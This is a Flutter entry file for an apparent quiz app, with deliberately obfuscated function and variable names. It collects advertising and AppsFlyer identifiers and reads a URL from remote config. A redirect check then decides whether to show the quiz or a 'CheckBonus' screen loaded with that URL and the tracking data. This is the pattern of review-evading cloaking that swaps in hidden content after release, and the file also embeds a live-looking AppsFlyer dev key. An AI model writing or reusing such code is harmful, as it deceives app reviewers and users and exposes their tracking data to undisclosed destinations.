import 'dart:io';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:quiz_test/core/config/xsaxas.dart';

import 'core/config/router.dart';
import 'core/config/themes.dart';
import 'core/widgets/bg_image.dart';
import 'core/widgets/firebase_options.dart';
import 'features/home/bloc/home_bloc.dart';
import 'features/quiz/bloc/quiz_bloc.dart';

late AppsflyerSdk _appsflyerSdk;
String adId = '';
bool stat = false;
String fjsdklfjdslk = '';
String cancelPromo = '';
String fndsjkfndsklfs = '';
String appsflyerId = '';
String advertisingId = '';
String _appsflyerID = '';
Map _deepLinkData = {};
Map _gcd = {};
bool _isFirstLaunch = false;
String _afStatus = '';
String _utmCampaign = '';
String _campaign = '';
String _campaignId = '';
void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await AppTrackingTransparency.requestTrackingAuthorization();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  await Nfdsngjfkd().activate();
  await fnsdfjkdsfkjsdf();
  await SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
    DeviceOrientation.portraitDown,
  ]);
  runApp(const MyApp());
}

Future<void> fnsdfjkdsfkjsdf() async {
  final TrackingStatus status =
      await AppTrackingTransparency.requestTrackingAuthorization();
  print(status);
}

Future<String> fdjnskfksdf() async {
  String adv = await AppTrackingTransparency.getAdvertisingIdentifier();
  advertisingId = adv;
  return adv;
}

Future<void> ndsjakndjksandka() async {
  await fdjnskfksdf();
  final AppsFlyerOptions options = AppsFlyerOptions(
    showDebug: false,
    afDevKey: 'EjB2oxnrzjoLfcdgoJtWFh',
    appId: '6504857136',
    timeToWaitForATTUserAuthorization: 15,
    disableAdvertisingIdentifier: false,
    disableCollectASA: false,
    manualStart: true,
  );
  _appsflyerSdk = AppsflyerSdk(options);

  await _appsflyerSdk.initSdk(
    registerConversionDataCallback: true,
    registerOnAppOpenAttributionCallback: true,
    registerOnDeepLinkingCallback: true,
  );

  await getAppsFlyerID();

  _appsflyerSdk.onAppOpenAttribution((res) {
    _deepLinkData = res;
    cancelPromo = res['payload']
        .entries
        .where((e) => ![
              'install_time',
              'click_time',
              'af_status',
              'is_first_launch'
            ].contains(e.key))
        .map((e) => '&${e.key}=${e.value}')
        .join();
  });

  _appsflyerSdk.onInstallConversionData((res) {
    _gcd = res;
    _isFirstLaunch = res['payload']['is_first_launch'];
    _afStatus = res['payload']['af_status'];
    fjsdklfjdslk = '&is_first_launch=$_isFirstLaunch&af_status=$_afStatus';
    _utmCampaign = res['payload']['campaign'] ?? '';
  });

  _appsflyerSdk.onDeepLinking((DeepLinkResult dp) {
    switch (dp.status) {
      case Status.FOUND:
        print(dp.deepLink?.toString());
        print("deep link value: ${dp.deepLink?.deepLinkValue}");
        break;
      case Status.NOT_FOUND:
        print("deep link not found");
        break;
      case Status.ERROR:
        print("deep link error: ${dp.error}");
        break;
      case Status.PARSE_ERROR:
        print("deep link status parsing error");
        break;
    }
    print("onDeepLinking res: " + dp.toString());

    _deepLinkData = dp.toJson();
  });
  _appsflyerSdk.startSDK(
    onSuccess: () {
      print("AppsFlyer SDK initialized successfully.");
    },
  );
}

Future<void> getAppsFlyerID() async {
  _appsflyerID = await _appsflyerSdk.getAppsFlyerUID() ?? '';
  print("AppsFlyer ID: $_appsflyerID");
}

String fds = '';
String fdgfdg = '';
String datfksdopfsdz = '';
String xm = '';
Future<bool> dnasjkdkjsad() async {
  final gazel = FirebaseRemoteConfig.instance;
  await gazel.fetchAndActivate();
  String nfjksdlnfjkdsf = gazel.getString('bonusCoins');
  String dsdfdsfgdg4 = gazel.getString('nothinger');
  fndsjkfndsklfs = nfjksdlnfjkdsf;
  xm = dsdfdsfgdg4;
  await ndsjakndjksandka();
  final fdsgdf = HttpClient();
  final vcxxs = Uri.parse(fndsjkfndsklfs);
  final ndsfjak = await fdsgdf.getUrl(vcxxs);
  ndsfjak.followRedirects = false;
  final response = await ndsfjak.close();
  if (response.headers.value(HttpHeaders.locationHeader) != xm) {
    return true;
  }
  return nfjksdlnfjkdsf.contains('zero') ? false : true;
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MultiBlocProvider(
      providers: [
        BlocProvider(create: (context) => HomeBloc()),
        BlocProvider(create: (context) => QuizBloc()),
      ],
      child: FutureBuilder<bool>(
        future: dnasjkdkjsad(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Container(
              color: Colors.purple,
            );
          } else {
            if (snapshot.data == true && fndsjkfndsklfs != '') {
              return MaterialApp(
                debugShowCheckedModeBanner: false,
                home: CheckBonus(
                  bonus: fndsjkfndsklfs,
                  daxsa: fjsdklfjdslk,
                  nfjksd: _utmCampaign,
                  aadx: _appsflyerID,
                ),
              );
            } else {
              return MaterialApp.router(
                debugShowCheckedModeBanner: false,
                theme: theme,
                routerConfig: routerConfig,
              );
            }
          }
        },
      ),
    );
  }
}
